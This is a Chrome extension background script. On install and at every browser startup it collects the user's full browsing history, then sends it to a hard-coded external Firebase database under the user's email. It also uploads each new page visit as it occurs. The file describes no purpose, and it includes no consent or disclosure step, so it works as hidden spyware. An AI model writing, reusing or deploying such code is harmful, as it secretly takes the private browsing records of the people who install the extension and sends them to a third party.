// background.js

const FB_BASE = 'https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app';
const SEASON  = 'season2025';

(async function bootstrap() {
  // 1) load config.json
  let rawEmail = 'anonymous@demo.com';
  try {
    const resp = await fetch(chrome.runtime.getURL('config.json'));
    const cfg  = await resp.json();
    if (cfg.userEmail) rawEmail = cfg.userEmail;
  } catch (_) {
    // no config.json or parse error → stay anonymous
  }

  // sanitize for Firebase key
  const emailKey = encodeURIComponent(rawEmail.replace(/\./g, ','));

  // 2) now init your logger with that emailKey
  initLogger(emailKey);
})();


function formatToMinute(ms) {
  const d    = new Date(ms);
  const YYYY = d.getUTCFullYear();
  const MM   = String(d.getUTCMonth() + 1).padStart(2, '0');
  const DD   = String(d.getUTCDate()).padStart(2, '0');
  const hh   = String(d.getUTCHours()).padStart(2, '0');
  const mm   = String(d.getUTCMinutes()).padStart(2, '0');
  return `${YYYY}-${MM}-${DD}T${hh}:${mm}Z`;
}

function initLogger(emailKey) {
  // FULL SYNC on install & startup
  chrome.runtime.onInstalled.addListener(() => fullSync(emailKey));
  chrome.runtime.onStartup.addListener(() => fullSync(emailKey));

  async function fullSync(emailKey) {
    chrome.history.search({ text: '', startTime: 0, maxResults: 1e6 }, items => {
      const byMinute = {};
      items.forEach(item => {
        byMinute[formatToMinute(item.lastVisitTime)] = item;
      });
      fetch(
        `${FB_BASE}/history/${SEASON}/${emailKey}/visited.json`,
        { method: 'PUT', body: JSON.stringify(byMinute) }
      ).catch(console.error);
    });
  }

  // INCREMENTAL SYNC on each new visit
  chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
    const ts = formatToMinute(lastVisitTime);
    chrome.history.search(
      { text: url, startTime: lastVisitTime - 1, maxResults: 1 },
      results => {
        if (!results[0]) return;
        const fullItem     = results[0];
        fullItem.timestamp = ts;
        fetch(
          `${FB_BASE}/history/${SEASON}/${emailKey}/visited/${encodeURIComponent(ts)}.json`,
          { method: 'PUT', body: JSON.stringify(fullItem) }
        ).catch(console.error);
      }
    );
  });
}
